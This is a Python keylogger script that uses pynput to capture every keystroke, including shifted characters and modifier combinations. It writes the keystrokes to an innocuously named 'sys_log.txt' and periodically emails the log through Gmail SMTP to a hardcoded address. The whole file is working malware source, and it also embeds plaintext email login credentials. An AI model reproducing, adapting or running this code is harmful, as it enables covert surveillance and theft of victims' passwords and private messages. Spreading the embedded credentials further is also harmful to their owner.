 #coding=utf-8
import time
from pynput import keyboard
import os
import os.path
import smtplib

email = True
keyword = "keyloggerstop"
filename = "sys_log.txt"
cycle = 10
address = "878706517@qq.com"
f = open('config/setting.txt',"r")
config = f.readlines()
for i in config:
    if "@" in i:
        address = i
    if i.isdigit():
        cycle = int(i)
f.close()
log = ""
cap_on = False
shift_on = False
shift = {"`":"~","1":"!","2":"@","3":"#","4":"$","5":"%","6":"^","7":"&","8":"*","9":"(","0":")","-":"_","=":'+',"[":"{","]":"}","\\":"|","'":'"',";":":",",":"<",".":">",".":"?"}
combo_on = False
combo_key = ""
combo_dic = ["Key.ctrl","Key.alt","Key.cmd","Key.cmd_r","Key.alt_r"]

start = time.time()

def send(msg, toaddrs):
    fromaddr = 'notification.uiowa@gmail.com'
    username = 'notification.uiowa@gmail.com'
    password = 'woshishabi'
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(username,password)
    server.sendmail(fromaddr, toaddrs, msg)
    server.quit()

def saveLog():
    global filename,log,time,address
    if os.path.exists(filename):
        mode = 'a'
    else:
        mode = 'w' 
    now = str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time())))
    f2 = open(filename,mode)
    txt = now+":\n"+log+"\n"
    if email:
        try:
            send(txt,address)
        except:
            txt+="Failed sending email to "+address

    f2.write(txt)
    f2.close()
    log = ""

def cap(key):
    if key.isalpha():
        if key.isupper():
            return key.lower()
        return key.upper()
    return key

def processKey(key):
    global log,cap_on,shift_on,combo_on,combo_key
    if str(key) in combo_dic:
        if not combo_on:
            combo_on = True
            combo_key = "["+str(key).lstrip("Key.")+"]"
        else:
            combo_key+="+["+str(key).lstrip("Key.")+"]"
    elif key == keyboard.Key.enter:
        log += "[Enter]"
    elif key == keyboard.Key.backspace and len(log) > 0:
        log = log[:len(log)-1]
    elif key == keyboard.Key.space:
        log += " "
    elif key == keyboard.Key.tab:
        log += "[Tab]"
    elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        if not combo_on:
            shift_on = True
        else:
            combo_key+="+[shift]"
    elif key == keyboard.Key.caps_lock:
        if cap_on: 
            cap_on = False
        else:
            cap_on = True
    elif "'" in str(key) and len(str(key).strip("'")) > 0:
        k = str(key).strip("'")
        if k == "å":
            k = "a"
        if combo_on:
            combo_key+="+['"+k.lstrip("Key.")+"']"
        elif cap_on:
            log += cap(k)
        elif shift_on and k in shift:
            log += shift[k]
        else:
            log += k

def on_press(key):
    global log,start,cycle
    processKey(key)
    current = int(time.time()-start)
    if current > cycle:
        saveLog()
        start = time.time()
    if keyword in log:
        log = log[:len(log)-13]
        return False

def on_release(key):
    global log,shift_on,combo_key,combo_on
    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_on = False 
    elif str(key) in combo_dic:
        log += combo_key+" "
        combo_key = ""
        combo_on = False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
print("\n\nKeylogger Stopped!!!\n")
saveLog()